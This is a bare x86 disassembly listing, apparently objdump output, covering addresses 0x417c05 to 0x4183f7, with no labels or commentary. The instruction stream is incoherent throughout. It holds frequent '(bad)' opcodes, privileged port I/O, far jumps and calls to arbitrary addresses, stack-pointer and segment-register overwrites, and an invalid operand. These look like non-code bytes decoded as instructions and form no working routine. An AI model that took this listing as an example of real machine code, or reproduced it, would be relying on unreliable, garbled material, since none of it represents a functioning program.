  417c05:	mov    WORD PTR [edx+edx*4],cs
  417c08:	sbb    eax,edx
  417c0a:	cmp    BYTE PTR [eax-0x740d0669],cl
  417c10:	(bad)  
  417c12:	mov    cl,0x8a
  417c14:	push   eax
  417c15:	das    
  417c16:	xor    eax,0xb9581965
  417c1b:	dec    esp
  417c1c:	sbb    eax,ebp
  417c1e:	shl    BYTE PTR ds:0x7fee0c07,1
  417c24:	js     0x417c32
  417c26:	cmc    
  417c27:	xchg   DWORD PTR [eax+ebx*1],eax
  417c2a:	jb     0x417c03
  417c2c:	mov    dh,0xd0
  417c2e:	lock pop ecx
  417c30:	pop    edi
  417c31:	fidiv  WORD PTR [ebx+0x70]
  417c34:	imul   ebx,DWORD PTR [ebx-0x72],0x7c
  417c38:	jecxz  0x417c54
  417c3a:	call   0xfe6043ee
  417c3f:	imul   ecx,DWORD PTR [eax],0xfffffff4
  417c42:	mov    esp,0x266c848a
  417c47:	call   0xd4ae703
  417c4c:	out    dx,eax
  417c4d:	rcl    esp,0xba
  417c50:	repz inc ecx
  417c52:	or     BYTE PTR [ebx+0x79],ah
  417c55:	and    eax,ebp
  417c57:	jnp    0x417c3f
  417c59:	pop    esi
  417c5a:	test   al,0x27
  417c5c:	jp     0x417c32
  417c5e:	mov    ds:0x6f6a3fdf,eax
  417c63:	cmovns ebx,DWORD PTR [edi]
  417c66:	cmp    eax,DWORD PTR [eax-0x19]
  417c69:	dec    eax
  417c6a:	ins    BYTE PTR es:[di],dx
  417c6c:	xlat   BYTE PTR ds:[ebx]
  417c6d:	pop    esi
  417c6e:	mov    edx,0xb67a9803
  417c73:	in     eax,0xef
  417c75:	push   ebp
  417c76:	aas    
  417c77:	cld    
  417c78:	adc    esi,DWORD PTR [eax]
  417c7a:	add    al,0x76
  417c7c:	jmp    0x8bb:0x23dc5422
  417c83:	mov    al,0x60
  417c85:	cmp    al,BYTE PTR [ebx*2-0x699e61c]
  417c8c:	mov    edx,0x65a542e8
  417c91:	dec    esi
  417c92:	ret    0xbaeb
  417c95:	dec    ecx
  417c96:	mov    ds:0x22353838,eax
  417c9b:	cld    
  417c9c:	icebp  
  417c9d:	fcmovne st,st(3)
  417c9f:	jbe    0x417c5f
  417ca1:	lods   eax,DWORD PTR ds:[esi]
  417ca2:	idiv   cl
  417ca4:	mov    ds:0x3dcc84ed,eax
  417ca9:	dec    BYTE PTR [edi]
  417cab:	xchg   ecx,eax
  417cac:	mov    dh,0x36
  417cae:	pop    esi
  417caf:	pop    eax
  417cb0:	pusha  
  417cb1:	ficomp DWORD PTR [edi]
  417cb3:	adc    BYTE PTR ds:0x2583a27b,0x56
  417cba:	ds fdivr st(0),st
  417cbd:	xor    al,BYTE PTR [ebx+eiz*8]
  417cc0:	sub    ch,BYTE PTR [ebp-0x4c49f1af]
  417cc6:	jo     0x417c76
  417cc8:	mov    DWORD PTR [ebx*4-0x658d08e1],esi
  417ccf:	out    0x17,eax
  417cd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417cd2:	je     0x417cd7
  417cd4:	mov    edx,0x77ba28d1
  417cd9:	pop    ss
  417cda:	sub    dl,BYTE PTR [esi]
  417cdc:	sbb    eax,0xf6de9bed
  417ce1:	jmp    0x69ec:0xa2c6129d
  417ce8:	in     eax,dx
  417ce9:	jae    0x417c80
  417ceb:	push   ecx
  417cec:	nop
  417ced:	hlt    
  417cee:	sub    BYTE PTR [edx+0x698b32aa],ch
  417cf4:	mov    ch,0x88
  417cf6:	xchg   esi,eax
  417cf7:	adc    ah,BYTE PTR [ecx-0x51]
  417cfa:	pop    edi
  417cfb:	ret    
  417cfc:	jle    0x417cf9
  417cfe:	cmp    bl,dh
  417d00:	rcr    BYTE PTR [eax-0x59c43400],1
  417d06:	xor    eax,0x6ba704e3
  417d0b:	out    0x5,al
  417d0d:	into   
  417d0e:	xchg   ecx,eax
  417d0f:	inc    ecx
  417d10:	mov    BYTE PTR [edx],bh
  417d12:	hlt    
  417d13:	(bad)  
  417d15:	pushf  
  417d16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d17:	mov    ebx,0xead781bc
  417d1c:	mov    bh,bh
  417d1e:	mov    eax,ds:0xdcb61bda
  417d23:	and    esi,DWORD PTR [edi+0x23243bc5]
  417d29:	sbb    al,0x9
  417d2b:	sub    BYTE PTR ds:0xcea53558,cl
  417d31:	fbld   TBYTE PTR [ebp-0x79b92af0]
  417d37:	ins    BYTE PTR es:[edi],dx
  417d38:	nop
  417d39:	mov    dh,0x79
  417d3b:	int3   
  417d3c:	out    dx,al
  417d3d:	arpl   WORD PTR [ebx],bx
  417d3f:	sub    ch,ah
  417d41:	mov    esp,0x10946d5d
  417d46:	fisub  WORD PTR [ebx+0x62]
  417d49:	shl    ecx,1
  417d4b:	push   0x631f4625
  417d50:	out    0xb6,al
  417d52:	inc    ebx
  417d53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d54:	jecxz  0x417d86
  417d56:	cs pop edx
  417d58:	push   esp
  417d59:	add    esp,DWORD PTR [esi-0x727b4869]
  417d5f:	dec    eax
  417d60:	shl    BYTE PTR ds:0xc7fc,cl
  417d65:	scas   al,BYTE PTR es:[edi]
  417d66:	stos   DWORD PTR es:[edi],eax
  417d67:	(bad)  
  417d68:	mov    al,0xd3
  417d6a:	xor    eax,0x2a0a032b
  417d6f:	sbb    DWORD PTR ds:0xc8117a53,ecx
  417d75:	jp     0x417d0d
  417d77:	jle    0x417dc7
  417d79:	clc    
  417d7a:	sbb    edi,DWORD PTR [ecx+ebp*4-0xa]
  417d7e:	repz xchg edx,eax
  417d80:	cmp    esp,DWORD PTR [ecx+0x66502110]
  417d86:	jp     0x417da9
  417d88:	push   cs
  417d89:	mov    dh,0x1e
  417d8b:	and    al,0xfc
  417d8d:	dec    edi
  417d8e:	mov    bh,0x97
  417d90:	out    0x14,eax
  417d92:	in     eax,dx
  417d93:	mov    dh,0xdf
  417d95:	or     BYTE PTR [esp+ebp*8],0x3e
  417d99:	pop    es
  417d9a:	push   ecx
  417d9b:	jno    0x417d75
  417d9d:	scas   al,BYTE PTR es:[edi]
  417d9e:	fsubr  QWORD PTR [eax-0x64]
  417da1:	mov    ds:0xa4c7ca39,eax
  417da6:	sub    al,0x32
  417da8:	not    DWORD PTR [esi+0x17]
  417dab:	mov    bh,0xf3
  417dad:	mov    ds:0x5cf3c0dc,al
  417db2:	add    al,0xae
  417db4:	je     0x417dbc
  417db6:	sub    al,0xe9
  417db8:	xor    eax,0x8f8ffb2c
  417dbd:	or     eax,0x39af768
  417dc2:	div    BYTE PTR [esi+esi*1]
  417dc5:	cdq    
  417dc6:	xchg   esi,eax
  417dc7:	and    edi,DWORD PTR [esi+0x18aaebdf]
  417dcd:	sub    BYTE PTR [esi],ah
  417dcf:	dec    ebx
  417dd0:	xor    eax,0x2f0247ef
  417dd5:	mov    al,ds:0xa628ba97
  417dda:	xor    BYTE PTR [edx-0x2b],0x5e
  417dde:	adc    DWORD PTR [ecx-0x67],edi
  417de1:	or     BYTE PTR [edx+0x1dbb8d0a],dh
  417de7:	inc    ecx
  417de8:	jmp    0xb5b9932f
  417ded:	jne    0x417e2e
  417def:	pop    ebp
  417df0:	adc    edx,DWORD PTR [ebp+0x6c828a]
  417df6:	mov    bh,0xc1
  417df8:	push   0x60eeaf4a
  417dfd:	cmp    DWORD PTR [ecx+0x38],esi
  417e00:	ret    0x3fa6
  417e03:	add    al,0xbb
  417e05:	test   eax,0x29cb9d99
  417e0a:	adc    edx,ebp
  417e0c:	push   ds
  417e0d:	lds    esi,FWORD PTR [esi]
  417e0f:	xchg   ebx,eax
  417e10:	cmc    
  417e11:	add    ebp,DWORD PTR [eax-0x601fedad]
  417e17:	js     0x417e59
  417e19:	pop    eax
  417e1a:	loop   0x417dcd
  417e1c:	aad    0xae
  417e1e:	popa   
  417e1f:	push   0x3eab59d3
  417e24:	ss jmp 0x417dd9
  417e27:	fistp  QWORD PTR [esi]
  417e29:	fdivr  QWORD PTR [ebx-0x73]
  417e2c:	clc    
  417e2d:	pop    ss
  417e2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e2f:	dec    ecx
  417e30:	add    al,0xee
  417e32:	loop   0x417de7
  417e34:	jecxz  0x417eb5
  417e36:	test   al,0xf2
  417e38:	mov    dl,bl
  417e3a:	jmp    0xd239f8ec
  417e3f:	sbb    al,BYTE PTR [eax+0xf]
  417e42:	jne    0x417ea6
  417e44:	cmp    eax,0x92f49a98
  417e49:	sub    eax,0xc93759bb
  417e4e:	addr16 adc al,0xc1
  417e51:	pushf  
  417e52:	fwait
  417e53:	and    eax,DWORD PTR [ecx+eax*2]
  417e56:	or     al,0x8d
  417e58:	adc    ch,bh
  417e5a:	xchg   BYTE PTR [edi+0x70],dh
  417e5d:	push   es
  417e5e:	xchg   esp,eax
  417e5f:	jbe    0x417e21
  417e61:	pop    ecx
  417e62:	fucomp st(2)
  417e64:	jp     0x417e90
  417e66:	aam    0x15
  417e68:	mov    ah,0xf2
  417e6a:	and    BYTE PTR [eax+0x5990f9f],bh
  417e70:	push   es
  417e71:	ins    BYTE PTR es:[edi],dx
  417e72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e73:	push   eax
  417e74:	jnp    0x417ef4
  417e76:	enter  0xf88,0x41
  417e7a:	pop    ebx
  417e7b:	outs   dx,BYTE PTR ds:[esi]
  417e7c:	(bad)  
  417e7d:	adc    eax,0x8f32d90e
  417e82:	jecxz  0x417e20
  417e84:	pop    edi
  417e85:	inc    eax
  417e86:	mov    ecx,0xf4236191
  417e8b:	xor    eax,0x58f1d7a0
  417e90:	xchg   DWORD PTR [esi+0x2f],eax
  417e93:	(bad)  
  417e94:	pop    edx
  417e95:	xor    ebp,DWORD PTR [esi+edx*2-0xb]
  417e99:	mov    bh,0x55
  417e9b:	dec    ecx
  417e9c:	dec    esi
  417e9d:	and    ch,bh
  417e9f:	mov    ah,0x97
  417ea1:	jmp    0xf69:0x64a3eb38
  417ea8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ea9:	out    0x53,eax
  417eab:	mov    ss,WORD PTR [ebx]
  417ead:	cli    
  417eae:	and    BYTE PTR [esi],cl
  417eb0:	jle    0x417e53
  417eb2:	mov    esi,0x818c6c6e
  417eb7:	xchg   al,ch
  417eb9:	inc    esp
  417eba:	fistp  WORD PTR [ebx]
  417ebc:	mov    ch,0x64
  417ebe:	jb     0x417e4b
  417ec0:	cmp    al,BYTE PTR [edx-0x80]
  417ec3:	arpl   WORD PTR [edx+ecx*8+0x551614b1],cx
  417eca:	retf   
  417ecb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ecc:	mov    ebp,0x528a34fb
  417ed1:	or     dh,BYTE PTR ss:[edi+0x52]
  417ed5:	adc    DWORD PTR [edx+0x705901e9],0xe
  417edc:	out    dx,eax
  417edd:	icebp  
  417ede:	fs mov esi,0x7ec7278c
  417ee4:	cdq    
  417ee5:	or     eax,0x82bfdcb6
  417eea:	nop
  417eeb:	sbb    DWORD PTR [ebp+esi*4-0x3d],esi
  417eef:	cs scas al,BYTE PTR es:[edi]
  417ef1:	nop
  417ef2:	loope  0x417f34
  417ef4:	sar    BYTE PTR [ebx],cl
  417ef6:	repz and DWORD PTR [ecx],ebx
  417ef9:	(bad)  
  417efa:	test   DWORD PTR [ecx+esi*8+0x4e57f056],0xa9fc5883
  417f05:	sahf   
  417f06:	in     al,dx
  417f07:	call   0x214d4ee7
  417f0c:	pop    ebx
  417f0d:	mov    esp,0xe0a8a366
  417f12:	ins    DWORD PTR es:[edi],dx
  417f13:	imul   ebx,DWORD PTR [edx],0x22
  417f16:	sbb    DWORD PTR [edx+0x440df437],edx
  417f1c:	arpl   di,ax
  417f1e:	sbb    ecx,0xffffffe0
  417f21:	cli    
  417f22:	pop    ebx
  417f23:	xor    ebp,0x4351e8bf
  417f29:	loop   0x417f08
  417f2b:	es ja  0x417ec4
  417f2e:	jmp    0x417efb
  417f30:	jl     0x417f73
  417f32:	pusha  
  417f33:	mov    dh,0x20
  417f35:	mov    ah,0xc7
  417f37:	cmp    BYTE PTR [ebx-0x4f],0x9
  417f3b:	ror    BYTE PTR es:[eax+eax*1],1
  417f3f:	push   es
  417f40:	scas   al,BYTE PTR es:[edi]
  417f41:	inc    edi
  417f42:	pusha  
  417f43:	add    BYTE PTR [edi-0x54],dh
  417f46:	dec    edi
  417f47:	setno  BYTE PTR [esi+0x2cb8fa18]
  417f4e:	dec    esp
  417f4f:	dec    edi
  417f50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f51:	push   cs
  417f52:	lock xchg edx,eax
  417f54:	scas   eax,DWORD PTR es:[edi]
  417f55:	ss out dx,eax
  417f57:	adc    BYTE PTR [ecx-0x7e],ch
  417f5a:	popf   
  417f5b:	push   ebx
  417f5c:	fisubr DWORD PTR [esi]
  417f5e:	mov    al,ds:0xe3eae8c
  417f63:	adc    DWORD PTR [eax-0x55],ecx
  417f66:	and    dl,dl
  417f68:	add    DWORD PTR [edi-0x1],ebp
  417f6b:	push   esp
  417f6c:	int    0xb5
  417f6e:	xor    ah,ch
  417f70:	aaa    
  417f71:	xchg   edx,eax
  417f72:	leave  
  417f73:	sub    ecx,eax
  417f75:	push   esi
  417f76:	ja     0x417fae
  417f78:	mov    dl,0x72
  417f7a:	mov    edx,0x404e93f4
  417f7f:	mov    eax,ds:0x6566e946
  417f84:	les    eax,FWORD PTR [edx+0x17]
  417f87:	mov    BYTE PTR [edx],dl
  417f89:	imul   edi,DWORD PTR [ecx+0x5b926d25],0x7001e649
  417f93:	jmp    0x3db34c4c
  417f98:	push   0x21
  417f9a:	rcr    edi,0x35
  417f9d:	mov    esp,0x73cc876f
  417fa2:	pop    edx
  417fa3:	test   eax,0x780c9ad
  417fa8:	adc    al,dl
  417faa:	imul   BYTE PTR [ebx-0x7a]
  417fad:	and    al,BYTE PTR [ecx]
  417faf:	pop    esi
  417fb0:	mov    ebp,0xcfea5cf5
  417fb5:	adc    ebx,DWORD PTR [ecx+0x180bd5e5]
  417fbb:	push   ecx
  417fbc:	pop    es
  417fbd:	int3   
  417fbe:	sahf   
  417fbf:	mov    dh,0xa1
  417fc1:	pop    ebx
  417fc2:	mov    dl,0x89
  417fc4:	xchg   ebp,ebx
  417fc6:	cld    
  417fc7:	ss daa 
  417fc9:	mov    ebp,0x6e11caf3
  417fce:	ffree  st(6)
  417fd0:	shl    DWORD PTR ds:[ecx-0x17],cl
  417fd4:	shl    DWORD PTR [eax+edi*1],cl
  417fd7:	sti    
  417fd8:	jo     0x417f69
  417fda:	stos   BYTE PTR es:[edi],al
  417fdb:	pusha  
  417fdc:	cmp    eax,0x1f55aaa
  417fe1:	pop    ebx
  417fe2:	add    al,0x25
  417fe4:	xor    DWORD PTR [esi],edx
  417fe6:	push   edi
  417fe7:	mov    esp,0x6de8aee
  417fec:	jmp    0x1ce4:0xcc401f1a
  417ff3:	inc    esp
  417ff4:	and    al,0x1c
  417ff6:	lds    ebp,FWORD PTR [ecx-0x9]
  417ff9:	dec    edi
  417ffa:	out    dx,eax
  417ffb:	pop    esp
  417ffc:	sub    ebp,ebx
  417ffe:	cmp    eax,0xe44f304b
  418003:	sahf   
  418004:	jb     0x41807e
  418006:	jmp    FWORD PTR [edi+0x5f]
  418009:	adc    al,0x47
  41800b:	jb     0x418000
  41800d:	pop    eax
  41800e:	xor    al,0x6f
  418010:	clc    
  418011:	mov    ah,bl
  418013:	aad    0xca
  418015:	gs (bad) 
  418018:	xor    DWORD PTR [ebx],0x9ed8f43c
  41801e:	test   eax,0xd52f4f59
  418023:	ret    
  418024:	xor    bl,ch
  418026:	xchg   edx,eax
  418027:	mov    bh,0x7
  418029:	sbb    bl,bl
  41802b:	pop    edi
  41802c:	inc    esi
  41802d:	std    
  41802e:	(bad)  
  41802f:	fist   DWORD PTR [ebp-0x6ccf985f]
  418035:	xchg   esi,eax
  418036:	push   0xffffffca
  418038:	loope  0x41803b
  41803a:	xchg   BYTE PTR [ecx+0x1f88541b],al
  418040:	add    al,0xd4
  418042:	xchg   esi,eax
  418043:	shl    BYTE PTR [ecx],cl
  418045:	or     ecx,DWORD PTR [edx]
  418047:	stc    
  418048:	outs   dx,DWORD PTR ds:[esi]
  418049:	push   esp
  41804a:	xlat   BYTE PTR ds:[ebx]
  41804b:	pop    ebx
  41804c:	jno    0x418006
  41804e:	inc    ecx
  41804f:	sbb    al,0xcf
  418051:	(bad)  
  418053:	imul   BYTE PTR [ebx]
  418055:	sub    BYTE PTR [ebp+0x48],dh
  418058:	mov    ebx,0xaf56a492
  41805d:	jecxz  0x418028
  41805f:	je     0x41806e
  418061:	ins    BYTE PTR es:[edi],dx
  418062:	leave  
  418063:	lds    edx,FWORD PTR [ecx+0x6f]
  418066:	sahf   
  418067:	dec    esp
  418068:	aas    
  418069:	sbb    BYTE PTR [ebx+0x31],al
  41806c:	jmp    0x418067
  41806e:	dec    edx
  41806f:	in     al,0x1b
  418071:	push   es
  418072:	repnz xchg ecx,eax
  418074:	das    
  418075:	repz cdq 
  418077:	adc    dh,ah
  418079:	pop    esp
  41807a:	mov    ebx,0xf7e4d99c
  41807f:	push   cs
  418080:	and    DWORD PTR [ebx],0x31db7ba7
  418086:	ror    BYTE PTR [edx-0x5ab65113],cl
  41808c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41808d:	fild   WORD PTR [edx+eax*2-0x58]
  418091:	adc    BYTE PTR [ecx-0x283a408e],dl
  418097:	mov    esi,0xcdc349c7
  41809c:	out    dx,eax
  41809d:	xchg   DWORD PTR [edx+0x3e],ecx
  4180a0:	fsub   QWORD PTR [eax]
  4180a2:	cli    
  4180a3:	dec    edx
  4180a4:	fld    QWORD PTR [eax-0x419908fd]
  4180aa:	adc    eax,DWORD PTR [edx]
  4180ac:	push   ecx
  4180ad:	clc    
  4180ae:	ja     0x41805d
  4180b0:	(bad)  
  4180b1:	mov    ds:0x8eae76a8,al
  4180b6:	mov    ebp,0x7903d141
  4180bb:	aad    0x5d
  4180bd:	add    edi,DWORD PTR [ebx]
  4180bf:	pushf  
  4180c0:	shr    cl,1
  4180c2:	sub    eax,0xd8c9ec56
  4180c7:	fldcw  WORD PTR [ecx+0x3c]
  4180ca:	inc    esi
  4180cb:	inc    ebp
  4180cc:	(bad)  
  4180cd:	rcr    DWORD PTR [edi],1
  4180cf:	sar    DWORD PTR [ebx+0x3dcbd32],0x45
  4180d6:	sbb    BYTE PTR [edx-0x66],ah
  4180d9:	inc    ebp
  4180da:	adc    al,0x3
  4180dc:	std    
  4180dd:	and    dl,BYTE PTR [esi+ecx*2+0x6bc47802]
  4180e4:	sbb    DWORD PTR [ebp-0x6b0e175a],ebx
  4180ea:	mov    eax,ds:0x9c18821b
  4180ef:	cmp    DWORD PTR [ecx+0x57fbd6ff],ebp
  4180f5:	mov    bl,0x85
  4180f7:	sbb    eax,0x5c4ed8e3
  4180fc:	add    esi,ecx
  4180fe:	fnclex 
  418100:	shl    DWORD PTR [esi+0x5f],1
  418103:	popf   
  418104:	cld    
  418105:	mov    al,ds:0x2502c122
  41810a:	xlat   BYTE PTR ds:[ebx]
  41810b:	mov    ch,BYTE PTR es:[ebp+0x6]
  41810f:	lds    esp,FWORD PTR [esi+0x574c9e0f]
  418115:	test   al,0xd3
  418117:	out    0x6e,eax
  418119:	gs inc edx
  41811b:	das    
  41811c:	rcr    BYTE PTR [esi-0x62],0x15
  418120:	aaa    
  418121:	and    DWORD PTR es:[edx+ecx*8-0x4df6d303],0x6826f267
  41812d:	xchg   ebp,eax
  41812e:	cmp    dh,BYTE PTR [ebp-0x572ac563]
  418134:	aas    
  418135:	xchg   esi,eax
  418136:	sti    
  418137:	xchg   DWORD PTR [ebp+0x3c17643c],edi
  41813d:	test   DWORD PTR [edi],0x36e4d1d4
  418143:	rcr    DWORD PTR [eax+0x6de435aa],0xca
  41814a:	(bad)  
  41814b:	jo     0x4180cf
  41814d:	add    DWORD PTR [esi],ebx
  41814f:	lock icebp 
  418151:	ja     0x4181bc
  418153:	push   esp
  418154:	gs mov dl,0xe6
  418157:	xchg   DWORD PTR [ebx+0x46ba75ff],ebx
  41815d:	cmp    DWORD PTR [ecx-0x1a],esp
  418160:	fmul   QWORD PTR [ebx-0x5c]
  418163:	rcr    edx,1
  418165:	fist   WORD PTR [edi]
  418167:	in     eax,0x4a
  418169:	shl    edx,cl
  41816b:	mov    edi,es
  41816d:	jno    0x418192
  41816f:	pop    esi
  418170:	pusha  
  418171:	ret    0x217f
  418174:	mov    eax,ds:0x4d53fd2c
  418179:	and    al,0x0
  41817b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41817c:	sub    dl,dl
  41817e:	jmp    0x2dd6a46
  418183:	fcomip st,st(3)
  418185:	adc    dl,0x8a
  418188:	pusha  
  418189:	jb     0x4181b5
  41818b:	xchg   ebp,eax
  41818c:	add    edx,DWORD PTR [ebp-0x7c]
  41818f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418190:	xchg   DWORD PTR [ecx+0x11],ebx
  418193:	jg     0x418160
  418195:	adc    DWORD PTR [edx],ecx
  418197:	jmp    0x7836:0x77c203d
  41819e:	mov    al,0x9
  4181a0:	(bad)  
  4181a1:	stc    
  4181a2:	sub    eax,0x5b4df8e4
  4181a7:	adc    BYTE PTR [edx+0x146aacf1],dh
  4181ad:	daa    
  4181ae:	push   edi
  4181af:	or     al,0xea
  4181b1:	repz add eax,DWORD PTR [esi+0x213b7c7d]
  4181b8:	mov    dh,0x7b
  4181ba:	and    BYTE PTR [ecx+0x9c2a4c1],ch
  4181c0:	frstor [ebx]
  4181c2:	add    BYTE PTR [ecx],bl
  4181c4:	sub    DWORD PTR [esi+0x16],0x1a30c1dd
  4181cb:	cmp    al,BYTE PTR ss:0xbec38383
  4181d2:	mov    eax,0x906a9253
  4181d7:	lods   al,BYTE PTR ds:[esi]
  4181d8:	imul   ebx,DWORD PTR ds:0xecec8bfe,0xffffff8b
  4181df:	inc    eax
  4181e0:	jb     0x41824b
  4181e2:	leave  
  4181e3:	nop
  4181e4:	lea    edi,[edi-0x7f020eda]
  4181ea:	test   al,0xec
  4181ec:	out    0xa,eax
  4181ee:	loopne 0x41824c
  4181f0:	fimul  DWORD PTR [edi+0x65]
  4181f3:	loope  0x4181bf
  4181f5:	out    0xda,al
  4181f7:	ja     0x4181eb
  4181f9:	jmp    FWORD PTR [esi]
  4181fb:	pop    es
  4181fc:	call   0x444454dd
  418201:	mov    dl,0x1c
  418203:	rol    BYTE PTR [ebx-0x5c149379],0x78
  41820a:	jb     0x4181ad
  41820c:	xor    eax,0x40d56a2f
  418211:	into   
  418212:	cmp    eax,0xc56dc2c7
  418217:	lods   al,BYTE PTR ds:[esi]
  418218:	add    dh,BYTE PTR [ecx]
  41821a:	std    
  41821b:	mov    ecx,ebx
  41821d:	add    ebx,ecx
  41821f:	jno    0x418211
  418221:	les    ebx,FWORD PTR [ebx+0x2b5da25e]
  418227:	adc    al,0x9d
  418229:	fld    DWORD PTR [ebx]
  41822b:	mov    esi,0xdee26dea
  418230:	jg     0x418218
  418232:	scas   eax,DWORD PTR es:[edi]
  418233:	and    cl,BYTE PTR [edi]
  418235:	inc    ebp
  418236:	jg     0x41823e
  418238:	outs   dx,DWORD PTR ds:[esi]
  418239:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41823a:	push   ds
  41823b:	push   cs
  41823c:	mov    bh,0xd3
  41823e:	test   DWORD PTR [edx+0x77],ecx
  418241:	adc    al,0xba
  418243:	int    0xd4
  418245:	and    edi,DWORD PTR [ebx]
  418247:	jle    0x4182c8
  418249:	cmovo  ebx,DWORD PTR [eax]
  41824c:	cmc    
  41824d:	test   BYTE PTR [esi+0x47],cl
  418250:	fisubr WORD PTR [ecx-0x16]
  418253:	dec    BYTE PTR [edx-0x36b0d385]
  418259:	js     0x4181e4
  41825b:	vunpcklps xmm0,xmm4,xmm0
  41825f:	mov    edx,0x508e72ee
  418264:	fld    DWORD PTR [ecx+0x5750b83c]
  41826a:	pop    es
  41826b:	cmp    DWORD PTR [edi-0x71],ebx
  41826e:	loope  0x4182c4
  418270:	(bad)  
  418272:	and    cl,BYTE PTR [ebx-0x5f]
  418275:	in     al,0x73
  418277:	sub    edx,DWORD PTR [ecx+0x48]
  41827a:	mov    ah,0xd5
  41827c:	outs   dx,DWORD PTR ds:[esi]
  41827d:	inc    ecx
  41827e:	push   edx
  41827f:	int3   
  418280:	adc    WORD PTR [eax+0x7cb709e9],cx
  418287:	xor    DWORD PTR [esi+0x2b819c],0x5828f31f
  418291:	daa    
  418292:	mov    BYTE PTR [esi-0x1443707e],ch
  418298:	jecxz  0x418285
  41829a:	push   ebp
  41829b:	das    
  41829c:	cmp    edx,DWORD PTR [eax]
  41829e:	scas   eax,DWORD PTR es:[edi]
  41829f:	or     DWORD PTR [ebp+esi*2-0x34f7b439],0x2c
  4182a7:	add    ecx,DWORD PTR [edx+0x5e]
  4182aa:	data16 add ah,bh
  4182ad:	mov    ?,WORD PTR [esi]
  4182af:	sub    BYTE PTR [ecx-0x56],dh
  4182b2:	add    al,0xa5
  4182b4:	adc    ah,BYTE PTR [edi]
  4182b6:	add    al,0x59
  4182b8:	xor    BYTE PTR [ecx+eiz*1-0x678453ef],bl
  4182bf:	gs mov ecx,0x513fc7ce
  4182c5:	cmp    DWORD PTR [esi],esp
  4182c7:	div    ch
  4182c9:	xchg   dh,bh
  4182cb:	pop    ebx
  4182cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182cd:	xor    esi,DWORD PTR [edi+ebx*8+0xd]
  4182d1:	imul   edx,DWORD PTR [eax-0x2e4a86a1],0x37
  4182d8:	test   BYTE PTR [edx+edx*4+0xb],0x48
  4182dd:	(bad)  
  4182de:	into   
  4182df:	std    
  4182e0:	(bad)  
  4182e1:	mov    dl,0xd3
  4182e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182e4:	mov    eax,0xc92466fc
  4182e9:	(bad)  
  4182ea:	idiv   DWORD PTR [edi]
  4182ec:	mov    DWORD PTR [eax+0x5d60e7ea],ebp
  4182f2:	(bad)  
  4182f3:	clc    
  4182f4:	addr16 xchg esp,eax
  4182f6:	popf   
  4182f7:	mov    esi,0x76f2631f
  4182fc:	(bad)  
  4182fd:	pop    ebp
  4182fe:	outs   dx,BYTE PTR ds:[esi]
  4182ff:	and    DWORD PTR [ecx-0x59a36b80],eax
  418305:	add    BYTE PTR [ebp+0x2a],bh
  418308:	or     eax,0x44cd5a3c
  41830d:	aad    0xcc
  41830f:	xor    cl,al
  418311:	cmp    eax,0xa0d57271
  418316:	xor    bl,cl
  418318:	sbb    ah,BYTE PTR [edi-0x48e7d181]
  41831e:	xor    al,0xe0
  418320:	(bad)  
  418321:	push   cs
  418322:	mov    dl,BYTE PTR [esp+edi*4+0x652f0c24]
  418329:	sub    edi,ebp
  41832b:	mul    BYTE PTR [edx+0x25b4a138]
  418331:	loop   0x4182f7
  418333:	push   edi
  418334:	je     0x4182f8
  418336:	rcl    DWORD PTR [esi+ecx*1-0x4d357c7d],0x97
  41833e:	test   BYTE PTR [ecx],dl
  418340:	(bad)  [eax+0x7]
  418343:	pop    DWORD PTR [ecx+edi*2+0xa]
  418347:	ds (bad) 
  41834a:	and    DWORD PTR [edx+0x1f8fa41],ebp
  418350:	je     0x418302
  418352:	aas    
  418353:	outs   dx,DWORD PTR ds:[esi]
  418354:	xchg   DWORD PTR [ebp+0x592002e],edx
  41835a:	cmp    ebp,ebx
  41835c:	push   esi
  41835d:	sub    al,0x93
  41835f:	mov    edi,0xceb7ce22
  418364:	xlat   BYTE PTR ds:[ebx]
  418365:	lods   eax,DWORD PTR ds:[esi]
  418366:	ins    BYTE PTR es:[edi],dx
  418367:	xchg   esp,eax
  418368:	fistp  QWORD PTR [eax+0x69f2761e]
  41836e:	cmp    dl,BYTE PTR [ebp+0x215a683]
  418374:	mov    al,ds:0xba5169a9
  418379:	inc    edi
  41837a:	sub    edi,DWORD PTR [ebx]
  41837c:	xchg   esi,edx
  41837e:	or     dl,BYTE PTR [edx-0x764ad919]
  418384:	add    eax,0x88492e77
  418389:	xchg   cx,ax
  41838b:	inc    esp
  41838c:	add    dl,ch
  41838e:	dec    edx
  41838f:	loop   0x418374
  418391:	dec    esp
  418392:	ret    
  418393:	inc    eax
  418394:	and    eax,0xf4bf7d7b
  418399:	xor    al,0x9
  41839b:	adc    eax,0xa289c69a
  4183a0:	mov    al,ds:0xca790297
  4183a5:	mov    ds:0x58cb0904,eax
  4183aa:	(bad)  
  4183ab:	(bad)  
  4183ac:	fnstsw WORD PTR [ebx-0x3765bf9b]
  4183b2:	test   BYTE PTR [esi+eiz*1+0x2e439e81],bl
  4183b9:	loop   0x41835e
  4183bb:	cwde   
  4183bc:	loop   0x418367
  4183be:	mov    al,0x3e
  4183c0:	mul    BYTE PTR [ebx-0x7cd26c20]
  4183c6:	mov    ds:0x88d4fb81,al
  4183cb:	shl    BYTE PTR [ecx+edx*2-0x7f727c72],1
  4183d2:	out    0xcf,eax
  4183d4:	xor    al,BYTE PTR [edi-0x4a378ca3]
  4183da:	or     eax,0xe3238392
  4183df:	fidivr DWORD PTR [ecx+eax*4-0x1fd028e]
  4183e6:	hlt    
  4183e7:	fimul  DWORD PTR [ebx]
  4183e9:	out    0x6d,eax
  4183eb:	cmp    eax,0xe5960783
  4183f0:	hlt    
  4183f1:	adc    BYTE PTR [edi-0x2d],0x73
  4183f5:	mov    BYTE PTR [eax],dh
  4183f7:	fnop   
